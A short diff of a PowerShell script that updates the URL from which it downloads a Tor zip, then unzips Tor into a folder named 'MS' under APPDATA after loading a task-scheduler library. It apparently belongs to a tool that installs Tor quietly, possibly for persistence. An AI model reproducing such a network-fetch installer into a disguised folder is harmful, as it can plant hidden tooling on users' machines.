@@ -65,7 +65,7 @@ $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
 $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
 $TFile=$env:Temp+'\t.zip';
 $DestTP=$env:APPDATA+'\MS';
-(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/7.0/tor-win32-0.3.0.7.zip',$TFile);
+(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/7.0.2/tor-win32-0.3.0.9.zip',$TFile);
 if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
 Unzip $TFile $DestTP;
 rm -Force $TFile;
